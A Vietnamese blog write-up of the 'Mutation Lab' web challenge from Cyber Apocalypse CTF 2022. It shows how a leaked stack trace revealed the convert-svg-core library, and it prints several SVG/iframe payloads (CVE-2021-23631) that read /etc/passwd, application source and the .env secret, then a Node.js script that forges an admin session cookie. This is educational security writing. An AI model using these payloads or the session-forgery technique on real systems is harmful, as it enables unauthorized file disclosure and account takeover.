Đợt vừa rồi, mình có tham gia thi **`Cyber Apocalypse CTF 2022` ,** năm ngoái mình cũng tham gia giải **`Cyber Apocalypse CTF 2021`** có viết writeup xịn xò [Cyber Apocalypse 202 1 Writeup](https://manhnv.com/tags/cyber-apocalypse-2021/)**,** chủ yếu mình tham gia giải mấy bài web là chính.

Năm nay tham gia thì cũng mục đích vào xem đề web hay có hay không, chứ không có ý định đi sâu, thì đâu đó ngồi hơn một buổi sáng thì clear được mấy bài như hình dưới:

![Những bài web đã giải được.](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-20_at_00.54.39.png)

Những bài web đã giải được.

Lý do mình không làm thêm là, dạo này đang bận rất nhiều việc với lại team của mình cũng bận chả ai tham gia, mình ham hố vào giải web thôi.

Ok, lý do thế đủ rồi, giờ vào nội dung chính bài nay nè. `Chỉ vì lỗi Improper Error Handling cũng có thể khiến ứng dụng web bị hack như thế nào?`

## Đề bài

Bài web này có tên là **`Mutation Lab`**

![Screen Shot 2022-05-15 at 12.11.50.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.11.50.png)

Địa chỉ web: `http://134.209.20.90:31789`, đây là một bài blackbox vì không được cung cấp source code.

Truy cập vào địa chỉ [`http://134.209.20.90:31789/`](http://134.209.20.90:31789/) chúng ta được một page như bên dưới nha.

![Screen Shot 2022-05-15 at 12.14.18.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.14.18.png)

## Cấu hình và Phân tích website này một chút

### Cấu hình Burpsuite

Để làm bài này mình cấu hình target scope cho Burpsuite rồi làm tiếp nhé. Nếu các bạn chưa biết Burpsuite thì có thể tự tìm hiểu [ở đây](https://portswigger.net/burp) nhé.

![Screen Shot 2022-05-15 at 12.13.03.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.13.03.png)

### Dạo vòng quanh và phân tích

Khi truy cập vào địa chỉ được cũng cấp, thì ứng dụng hiển thị ra 1 page có chức năng login và register.

Trước tiên chưa có tài khoản nên mình cứ thử register trước xem sao nhé. Thử đăng ký một tài khoản có tên `0xmanhnv`

![Screen Shot 2022-05-15 at 12.16.34.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.16.34.png)

Đăng ký thành công! và đăng nhập với tài khoản vừa đăng ký thì được một trang đầy rẫy `trung tình`  và 1 hình ảnh giống miếng `thịt bò` (Thực ra là hình ảnh tế bào) như thế này:

![Screen Shot 2022-05-15 at 12.17.01.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.17.01.png)

Mình tiếp tục dạo 1 vòng các chức năng có trên ứng dụng này, thì mình tổng hợp được một số chức năng như sau:

- `Reset Experimentation` → Chức năng này là reset lại trạng thái của miếng `thịt bò` kia và mấy con `trung tình` về 1 trạng thái random, không có sự tương tác với server.
- `Export Cell Structure` → ? Chưa biết chức năng này dùng làm gì và sẽ tìm hiểu ở phần sau.
- `Export TadPole Samples` → ? Chưa biết chức năng này dùng làm gì và sẽ tìm hiểu ở phần sau.
- `Logout` → chức năng này không cần quan tâm

Giờ là lúc tìm hiểu 2 chức năng `Export Cell Structure` và `Export TadPole Samples` làm những gì.

Khi bấm vào `Export TadPole Samples`, ứng dụng sẽ xử lý một cái gì đó và đưa mình đến đến 1 link ảnh [`http://134.209.20.90:31789/exports/c212e64c11dadcfc4f23986a47f2b84b.png`](http://134.209.20.90:31789/exports/c212e64c11dadcfc4f23986a47f2b84b.png). Hình ảnh này có mấy con `trung tình` ở trạng thái giống với lúc mình bấm nút `Export TadPole Samples` .Mình đoán là ảnh này là chụp lại trạng thái mấy con `trung tình` ở thời điểm bấm nút và được export thành ảnh png.

![Screen Shot 2022-05-15 at 12.22.53.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.22.53.png)

Tiếp theo thử bấm nút `Export Cell Structure` , thì cũng tương tự như trên nhưng lần này là `miếng thịt bò` đã được export ra thành ảnh png.

![Screen Shot 2022-05-15 at 12.24.24.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.24.24.png)

Vậy là mình đã hiểu sơ qua về cách hoạt động của ứng dụng trên UI, giờ mình thử chuyển qua Burpsuite kiểm tra thử xem, thực sự thì 2 chức năng này nó tương tác với server như thế nào?

Khi vào Burpsuite, mình thấy Burpsuite đã bắt được 7 requests, trong đó

- `/` là lúc mình đi đến đường dẫn [`http://134.209.20.90:31789/`](http://134.209.20.90:31789/)
- `/api/register` là lúc bấm nút đăng ký
- `/api/login` là lúc bấm nút login
- `/api/dashboard` khi login thành công, được chuyển hướng sang dashboard
- 2 requests `/api/export`  trả về kết quả thành công → Mình đoán là do tôi bấm vào `Export Cell Structure` và `Export TadPole Samples`
- 1 requests `/api/export`  trả về kết quả `Error` ⇒ Mình cho nó là đáng nghi ngờ, và chắc chắn cần phải kiểm tra.

![Screen Shot 2022-05-15 at 12.26.07.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.26.07.png)

Mình tiến hành xem qua 3 request `/api/export`.

- Với 2 requests thành công, thì thấy dữ liệu gửi lên là dữ liệu là `json` có `key` là `svg` với `value` là `nội dung của ảnh SVG`.

![Screen Shot 2022-05-15 at 12.30.23.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.30.23.png)

Sau khi request được gửi thành công, dữ liệu được trả về là 1 đường dẫn tới ảnh png `/exports/17cd2093d6247f486094b36d6e39bec4.png` so sánh kết quả của cả 2 request thì chính là đường dẫn của 2 ảnh được export ra bên trên.

![Screen Shot 2022-05-15 at 12.31.33.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.31.33.png)

Đến đây mình lại đoán hoặc kết luận luôn trong suy nghĩ của mình cũng được là: Khi bấm vào nút `Export Cell Structure` hoặc `Export TadPole Samples`, Client sẽ chụp lại trạng thái của bầy `trung tình` hoặc `miếng thịt bò` tương ứng bằng `svg` sau đó gửi dữ liệu `svg` đó lên server để server `export` ra ảnh `png` và trả về đường dẫn cho client hiển thị lên.

Ok, vậy requests thành công thì là như thế, nhưng request bị lỗi thì sao nhỉ?

Tiếp tục xem nội dung request lỗi thì thấy trong dữ liệu json gửi lên, value của `svg` là `null` 

![Screen Shot 2022-05-15 at 12.33.53.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.33.53.png)

Xem response lỗi được trả về:

![Screen Shot 2022-05-15 at 12.34.53.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.34.53.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError: Cannot read properties of null (reading &#39;indexOf&#39;)<br> &nbsp; &nbsp;at Converter.[convert] (/app/node_modules/convert-svg-core/src/Converter.js:191:25)<br> &nbsp; &nbsp;at Converter.convert (/app/node_modules/convert-svg-core/src/Converter.js:114:40)<br> &nbsp; &nbsp;at API.convert (/app/node_modules/convert-svg-core/src/API.js:80:32)<br> &nbsp; &nbsp;at /app/routes/index.js:61:21<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /app/node_modules/express/lib/router/index.js:286:22<br> &nbsp; &nbsp;at Function.process_params (/app/node_modules/express/lib/router/index.js:348:12)</pre>
</body>
</html>
```

Mình lại đoán tiếp (Vì khi mà không biết chắc chắn thì cứ đoán): Khi Client gửi nội dung `svg` với giá trị `null`, ứng dụng không xử lý được và gây ra lỗi nhưng lỗi này không được xử lý trước khi trả về, mà trả thẳng lỗi của runtime của ứng dụng về cho Client, và vô tình ta biết được một số thông tin của ứng dụng.

Trong lỗi trả về này, tôi có được một số thông tin có thể hữu ích như sau

- `/app/routes/index.js` → Nơi chứa source code route của ứng dụng này, từ đây có thể suy đoán ra được folder `/app` chính là nơi chứa `source code` của ứng dụng.
- `TypeError: Cannot read properties of null (reading 'indexOf')<br> at Converter.[convert] (/app/node_modules/convert-svg-core/src/Converter.js:191:25)` → lỗi không thể xử lý với `properties null` xảy ra trong `/app/node_modules/convert-svg-core/src/Converter.js` → vậy là ứng dụng có sử dụng module có tên là `convert-svg-core`

## Tìm lỗ hổng

Sau khi đi qua các chức năng, và hiểu sơ qua về ứng dụng, đây là lúc đi tìm lỗ hổng. Hiện tại chức năng nghi ngờ nhất, và khiến mình muốn tập trung nhất là chức năng export với API `/api/export`

Sao lại như vậy? Vì:

- Có sự tương tác với server.
- Dữ liệu sai (Ví dụ ở đây là null) thì server trả về lỗi, vậy là lỗi không được thực hiện tiền xử lý. → Unstrusted data

Ở phần trên, tôi đã biết ứng dụng sử dụng `convert-svg-core`, trước hết mình target vào module này bằng cách đi tìm xem nó có tồn tại vuln nào tồn tại trong module này không?

![Screen Shot 2022-05-15 at 13.09.39.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.09.39.png)

Search google thì ra rất nhiều kết quả là `CVE-2021-23631` lỗ hổng Directory Traversal rất mới, năm 2021, được `7.5 điểm`, lỗ hổng mức `high`. Thử tìm hiểu về CVE này xem nhé.

```jsx
https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785
```

![Screen Shot 2022-05-15 at 13.11.10.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.11.10.png)

Đọc qua về CVE thì mình có thể biết được payload trong phần ví dụ của CVE.

```html
<svg-dummy></svg-dummy>
<iframe src="**file:///etc/passwd**" width="100%" height="1000px"></iframe>
<svg viewBox="0 0 240 80" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="0" class="Rrrrr" id="demo">data</text>
</svg>
```

Hiểu sơ qua thì payload này sử dụng thẻ `iframe` chèn vào nội dung `svg`, và `iframe` sẽ load `file:///path/to/file` , trong ví dụ là load file `/etc/passwd`

Trước tiên, tôi thử với payload có được, để xem nó có chạy không?

Nhưng trước khi chạy chúng ta cần làm một số thao tác để chuẩn hóa lại payload, vì data request lên server là ở dạng json

```json
{"svg": "payload"}
```

Nên những dấu `"` trong payload cần đưa về `'` hoặc `\"` để không bị `escape` ra khỏi json, tôi thực hiện một số thao tác magic như bên dưới.

Replace `"` thành `\"`

![Screen Shot 2022-05-15 at 13.18.44.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.18.44.png)

Kết quả replace `"` thành `\"`

![Screen Shot 2022-05-15 at 13.19.23.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.19.23.png)

Tiếp theo tôi cần phải đưa payload thành 1 dòng, bằng cách bỏ đi `\n`

![Screen Shot 2022-05-15 at 13.19.59.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.19.59.png)

Sau khi thực hiện các bước trên, payload có được sẽ là:

```html
<svg-dummy></svg-dummy><iframe src=\"**file:///etc/passwd**\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>
```

Tôi thử gửi dữ liệu với payload lên server, bằng chức năng repeater của Burpsuite.

![Screen Shot 2022-05-15 at 13.21.14.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.21.14.png)

Kết quả của request thành công và được 1 đường dẫn ảnh png, thử truy cập vào.

![Screen Shot 2022-05-15 at 13.21.45.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.21.45.png)

Ok, thành công. Tôi đã có thể đọc được nội dung `/etc/passwd` của server.

## Leak source code ứng dụng.

Bây giờ tôi thử đọc source code của ứng dụng.

Trước tiên là file `/app/index.js`

```html
<svg-dummy></svg-dummy><iframe src=\"file://**/app/index.js**\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>
```

![Screen Shot 2022-05-15 at 13.28.02.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.28.02.png)

Kết quả thành công và nội dung source code của file `/app/index.js`

![Screen Shot 2022-05-15 at 13.28.28.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.28.28.png)

Phần trên tôi đã biết là có `/app/routes/index.js`, vậy tôi đọc tiếp source code của nó.

```html
<svg-dummy></svg-dummy><iframe src=\"file://**/app/routes/index.js**\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>
```

![Screen Shot 2022-05-15 at 13.24.32.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.24.32.png)

Kết quả thành công và nội dung source code của file `/app/routes/index.js`

![Screen Shot 2022-05-15 at 13.25.08.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.25.08.png)

Vậy là đã đọc được source của `index` và `routes` của ứng dụng, hình ảnh tuy bị giới hạn độ dài không đọc được hết nội dung 1 file, tuy nhiên hiện tại như thế này là đủ. 

Sau khi đọc source của 2 file giờ đây mình có thêm một số thông tin như sau:

- `/app/.env` → Thường là nơi chưa file cấu hình `environment` của ứng dụng.
- Ứng dụng sử dụng `SESSION_SECRET_KEY` trong process.env (được load từ `/app/.env`) để tạo session.
    
    ![Screen Shot 2022-05-15 at 13.38.01.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.38.01.png)
    
- Để có thể đọc được flag thì `session.username` phải là `admin`
    
    ![Screen Shot 2022-05-15 at 13.37.01.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.37.01.png)
    

Tôi đi giải quyết từng cái một nhé.

- **`/app/.env` → Nơi chưa file cấu hình** `environment` **của ứng dụng**

Tối đọc thử nó xem như thế nào.

```html
<svg-dummy></svg-dummy><iframe src=\"file://**/app/.env**\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>
```

![Screen Shot 2022-05-15 at 13.41.21.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.41.21.png)

Kết quả thành công và tôi đã có `SESSION_SECRET_KEY`

![Screen Shot 2022-05-15 at 13.41.53.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.41.53.png)

Ở đây vì thông tin trả về là ảnh, không copy được thì có thể dùng Iphone hoặc download ảnh về dùng mấy tools tách chữ từ ảnh mà đọc nhé, ở đây mình dùng camera điện thoại để đọc và copy text ra.

![IMG_3682.PNG](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/IMG_3682.png)

```
SESSION_SECRET_KEY=5921719c3037662e94250307ec5ed1db
```

Nhắc lại một chút:

- Ứng dụng sử dụng `SESSION_SECRET_KEY` để tạo `session`
- Để có thể đọc được `flag` thì `session.username` phải là `admin`

Tôi thực hiện code 1 đoạn `nodejs express` để tái hiện lại cách tạo `session` bằng `SESSION_SECRET_KEY` vừa lấy được như sau:

```jsx
const express = require('express');
const session = require('cookie-session');
const cookieParser = require('cookie-parser');
const { response } = require('express');
const app = express();

app.use(express.json({limit: '2mb'}));
app.use(cookieParser());

app.use(session({
    name: 'session',
    keys: ['5921719c3037662e94250307ec5ed1db'],
}))

app.get('/', (req, res) => {
    req.session.username = 'admin';
    res.send(req.session);
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
```

Chạy đoạn code trên và truy cập đến địa chỉ `[http://127.0.0.1:3000](http://127.0.0.1:3000)`.

![Screen Shot 2022-05-15 at 13.48.01.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.48.01.png)

Tôi có được được 

```jsx
session=eyJ1c2VybmFtZSI6ImFkbWluIn0=
session.sig=EYdvy2mhVoEznETyhYjNYFFZM8o
```

Bây giờ dùng thông tin `session` và `seesion.sig` có được gửi request đến `/dashboard`.  

![Screen Shot 2022-05-15 at 13.54.14.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.54.14.png)

Kết quả thành công, mình đã có flag nè.

`HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}`

Tại thời điểm giải bài này có 53 flag được submit tính cả mình.

![Screen Shot 2022-05-15 at 13.55.07.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.55.07.png)

## Kết luận

Qua bài này các bạn cũng có thể nhận thấy một điều là chỉ một sai sót không xử lý lỗi trước khi trả về + tin tưởng dữ liệu từ client gửi lên cũng khiến cho một ứng dụng web bị hack như thế nào.

Cảm ơn các bạn đã dành thời gian đọc bài.

Còn mấy bài còn lại rất hay, nhưng dạo này có vẻ bận, nếu như có thời gian mình sẽ writeup hết sau nhé.